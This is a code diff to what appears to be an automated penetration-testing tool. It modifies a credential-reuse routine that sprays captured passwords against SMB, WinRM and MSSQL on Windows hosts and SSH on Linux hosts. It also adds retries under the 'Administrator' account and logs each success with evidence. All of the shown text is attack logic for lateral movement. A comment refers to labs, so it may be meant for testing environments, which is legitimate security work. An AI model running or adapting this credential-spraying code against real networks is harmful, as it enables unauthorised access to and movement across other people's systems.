@@ -321,59 +321,68 @@ def run() -> list[dict]:
             if target_ip == source_host:
                 continue
 
-            # ---- Domain credentials -> SMB, WinRM, MSSQL (Windows targets) ----
-            if is_domain and _is_windows(host_entry):
+            # ---- Windows targets: try SMB, WinRM, MSSQL ----
+            if _is_windows(host_entry):
+                # For non-domain creds, also try Administrator as username
+                # (password reuse across Linux/Windows is very common in labs)
+                win_users = [(username, domain)]
+                if not is_domain and username.lower() != "administrator":
+                    win_users.append(("Administrator", ""))
 
-                if _port_open(host_entry, PORT_SMB):
-                    if attempt_count.get(cred_key, 0) < MAX_ATTEMPTS:
-                        attempt_count[cred_key] = attempt_count.get(cred_key, 0) + 1
-                        print(f"[reuse] Testing {display}:{password} against {target_ip} SMB...")
-                        ok, evidence = _try_smb(target_ip, username, password, domain)
-                        reuse_events.append({
-                            "credential":  {"username": username, "password": password, "domain": domain},
-                            "source_host": source_host,
-                            "target_host": target_ip,
-                            "service":     "smb",
-                            "success":     ok,
-                            "evidence":    evidence,
-                        })
-                        if ok:
-                            print(f"[reuse]   SUCCESS: {evidence}")
+                for win_user, win_domain in win_users:
+                    win_key = (win_user.lower(), password, win_domain.lower())
+                    win_display = f"{win_domain}\\{win_user}" if win_domain else win_user
 
-                if _port_open(host_entry, PORT_WINRM):
-                    if attempt_count.get(cred_key, 0) < MAX_ATTEMPTS:
-                        attempt_count[cred_key] = attempt_count.get(cred_key, 0) + 1
-                        print(f"[reuse] Testing {display}:{password} against {target_ip} WinRM...")
-                        ok, evidence = _try_winrm(target_ip, username, password, domain)
-                        reuse_events.append({
-                            "credential":  {"username": username, "password": password, "domain": domain},
-                            "source_host": source_host,
-                            "target_host": target_ip,
-                            "service":     "winrm",
-                            "success":     ok,
-                            "evidence":    evidence,
-                        })
-                        if ok:
-                            print(f"[reuse]   SUCCESS: {evidence}")
+                    if _port_open(host_entry, PORT_SMB):
+                        if attempt_count.get(win_key, 0) < MAX_ATTEMPTS:
+                            attempt_count[win_key] = attempt_count.get(win_key, 0) + 1
+                            print(f"[reuse] Testing {win_display}:{password} against {target_ip} SMB...")
+                            ok, evidence = _try_smb(target_ip, win_user, password, win_domain)
+                            reuse_events.append({
+                                "credential":  {"username": win_user, "password": password, "domain": win_domain},
+                                "source_host": source_host,
+                                "target_host": target_ip,
+                                "service":     "smb",
+                                "success":     ok,
+                                "evidence":    evidence,
+                            })
+                            if ok:
+                                print(f"[reuse]   SUCCESS: {evidence}")
 
-                if _port_open(host_entry, PORT_MSSQL):
-                    if attempt_count.get(cred_key, 0) < MAX_ATTEMPTS:
-                        attempt_count[cred_key] = attempt_count.get(cred_key, 0) + 1
-                        print(f"[reuse] Testing {display}:{password} against {target_ip} MSSQL...")
-                        ok, evidence = _try_mssql(target_ip, username, password, domain)
-                        reuse_events.append({
-                            "credential":  {"username": username, "password": password, "domain": domain},
-                            "source_host": source_host,
-                            "target_host": target_ip,
-                            "service":     "mssql",
-                            "success":     ok,
-                            "evidence":    evidence,
-                        })
-                        if ok:
-                            print(f"[reuse]   SUCCESS: {evidence}")
+                    if _port_open(host_entry, PORT_WINRM):
+                        if attempt_count.get(win_key, 0) < MAX_ATTEMPTS:
+                            attempt_count[win_key] = attempt_count.get(win_key, 0) + 1
+                            print(f"[reuse] Testing {win_display}:{password} against {target_ip} WinRM...")
+                            ok, evidence = _try_winrm(target_ip, win_user, password, win_domain)
+                            reuse_events.append({
+                                "credential":  {"username": win_user, "password": password, "domain": win_domain},
+                                "source_host": source_host,
+                                "target_host": target_ip,
+                                "service":     "winrm",
+                                "success":     ok,
+                                "evidence":    evidence,
+                            })
+                            if ok:
+                                print(f"[reuse]   SUCCESS: {evidence}")
+
+                    if _port_open(host_entry, PORT_MSSQL):
+                        if attempt_count.get(win_key, 0) < MAX_ATTEMPTS:
+                            attempt_count[win_key] = attempt_count.get(win_key, 0) + 1
+                            print(f"[reuse] Testing {win_display}:{password} against {target_ip} MSSQL...")
+                            ok, evidence = _try_mssql(target_ip, win_user, password, win_domain)
+                            reuse_events.append({
+                                "credential":  {"username": win_user, "password": password, "domain": win_domain},
+                                "source_host": source_host,
+                                "target_host": target_ip,
+                                "service":     "mssql",
+                                "success":     ok,
+                                "evidence":    evidence,
+                            })
+                            if ok:
+                                print(f"[reuse]   SUCCESS: {evidence}")
 
             # ---- Local (non-domain) credentials -> SSH (Linux targets) ----
-            elif not is_domain and _is_linux(host_entry):
+            if not is_domain and _is_linux(host_entry):
 
                 if _port_open(host_entry, PORT_SSH):
                     if attempt_count.get(cred_key, 0) < MAX_ATTEMPTS:
